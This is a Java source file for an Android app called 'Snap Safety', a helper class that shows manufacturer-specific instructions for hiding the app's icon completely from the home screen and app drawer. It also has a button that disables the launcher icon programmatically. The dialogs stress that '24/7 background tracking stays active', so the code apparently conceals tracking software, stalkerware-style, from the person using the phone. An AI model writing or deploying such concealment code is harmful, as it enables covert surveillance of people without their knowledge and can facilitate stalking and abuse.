package com.snapapp.companion;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.widget.Toast;

public class AppHideHelper {

    public static void showHideDialog(final Activity activity) {
        String m = Build.MANUFACTURER.toLowerCase();
        String title, msg;
        final Runnable opener;

        if (m.contains("samsung")) {
            title = "Hide on Samsung (One UI)";
            msg = "Samsung One UI blocks programmatic icon hiding to protect system stability.\n\n"
                    + "To hide 100% invisibly:\n"
                    + "1. Tap 'Open Home Settings' below\n"
                    + "2. Tap 'Hide apps on Home and Apps screens'\n"
                    + "3. Select 'Snap Safety' & tap Done.\n\n"
                    + "✓ Icon vanishes completely from home & app drawer\n"
                    + "✓ 24/7 background tracking stays active (never killed)";
            opener = () -> launchSamsung(activity);
        } else if (m.contains("vivo")) {
            title = "Hide on Vivo (FunTouch OS)";
            msg = "To hide 100% invisibly:\n"
                    + "1. Tap 'Open Security' below\n"
                    + "2. Tap 'Privacy and app encryption' → 'App Hiding'\n"
                    + "3. Turn ON 'Snap Safety'.\n\n"
                    + "✓ Icon vanishes completely\n"
                    + "✓ 24/7 background tracking stays active";
            opener = () -> launchVivo(activity);
        } else if (m.contains("oppo") || m.contains("realme") || m.contains("oneplus")) {
            title = "Hide on Oppo / Realme (ColorOS)";
            msg = "To hide 100% invisibly:\n"
                    + "1. Tap 'Open Privacy' below\n"
                    + "2. Tap 'Hide Apps'\n"
                    + "3. Set dialer passcode (e.g. #1234#) & turn ON 'Snap Safety'.\n\n"
                    + "✓ Icon vanishes completely from phone\n"
                    + "✓ Access anytime via Phone Dialer code";
            opener = () -> launchOppo(activity);
        } else if (m.contains("tecno") || m.contains("infinix") || m.contains("itel")) {
            title = "Hide on Tecno / Infinix (HiOS/XOS)";
            msg = "To hide 100% invisibly:\n"
                    + "1. Pinch in on Home Screen (or open Phone Master app)\n"
                    + "2. Select 'Hide Apps' / XHide\n"
                    + "3. Add 'Snap Safety'.\n\n"
                    + "✓ Icon vanishes completely\n"
                    + "✓ 24/7 background tracking stays active";
            opener = () -> launchTecno(activity);
        } else {
            title = "Hide on " + Build.MANUFACTURER;
            msg = "To hide invisibly:\n"
                    + "1. Open Home Screen settings or Security\n"
                    + "2. Select 'Hide Apps'\n"
                    + "3. Choose 'Snap Safety'.\n\n"
                    + "✓ Icon vanishes completely";
            opener = () -> safeStart(activity, new Intent(Settings.ACTION_SETTINGS));
        }

        new AlertDialog.Builder(activity)
                .setTitle(title)
                .setMessage(msg)
                .setPositiveButton("Open Settings", (d, w) -> opener.run())
                .setNeutralButton("Force Disable Icon", (d, w) -> {
                    try {
                        PackageManager pm = activity.getPackageManager();
                        ComponentName cn = new ComponentName(activity, MainActivity.class);
                        pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                        Toast.makeText(activity, "Disabled icon. Reboot device if still visible.", Toast.LENGTH_LONG).show();
                        activity.finish();
                    } catch (Exception e) {
                        Toast.makeText(activity, "Failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                    }
                })
                .setNegativeButton("Close", null)
                .show();
    }

    private static void launchSamsung(Activity a) {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.sec.android.app.launcher", "com.sec.android.app.launcher.settings.HomeSettingsActivity"));
            a.startActivity(intent);
        } catch (Exception e) {
            safeStart(a, new Intent(Settings.ACTION_HOME_SETTINGS));
        }
    }

    private static void launchVivo(Activity a) {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.safeguard.PurviewTabActivity"));
            a.startActivity(intent);
        } catch (Exception e) {
            safeStart(a, new Intent(Settings.ACTION_SECURITY_SETTINGS));
        }
    }

    private static void launchOppo(Activity a) {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.privacy.PrivacyTopActivity"));
            a.startActivity(intent);
        } catch (Exception e) {
            safeStart(a, new Intent(Settings.ACTION_PRIVACY_SETTINGS));
        }
    }

    private static void launchTecno(Activity a) {
        try {
            Intent intent = a.getPackageManager().getLaunchIntentForPackage("com.transsion.phonemaster");
            if (intent != null) {
                a.startActivity(intent);
                return;
            }
        } catch (Exception ignored) {}
        safeStart(a, new Intent(Settings.ACTION_SETTINGS));
    }

    private static void safeStart(Activity a, Intent intent) {
        try {
            a.startActivity(intent);
        } catch (Exception e) {
            try {
                a.startActivity(new Intent(Settings.ACTION_SETTINGS));
            } catch (Exception ignored) {}
        }
    }
}
